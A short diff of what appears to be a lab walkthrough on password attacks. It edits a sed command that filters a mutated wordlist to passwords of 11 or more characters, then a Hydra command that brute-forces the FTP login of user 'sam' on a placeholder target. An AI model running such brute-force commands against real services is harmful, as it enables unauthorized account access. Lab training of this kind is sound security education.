@@ -35,13 +35,13 @@ Create a mutated wordlist using the files in the ZIP file under "Resources." Use
 4. **Filter Mutated Wordlist**
    Edit the mutated wordlist to filter passwords with a length of 11 or more characters:
    ```bash
-   sed -n '/^[[:alnum:][:punct:]]\{11,\}$/p' mut_password.list
+   sed -n '/^[[:alnum:][:punct:]]\{11,\}$/p' mut_password.list > mut_pass.list
    ```
 
 5. **Brute Force with Hydra**
    Use Hydra to find the password for the user "sam" on the FTP service:
    ```bash
-   hydra -l sam -P mut_password.list ftp://<$target_ip> -t 48 -v
+   hydra -l sam -P mut_pass.list ftp://<$target_ip> -t 48 -v
    ```
    Example successful output:
    ```
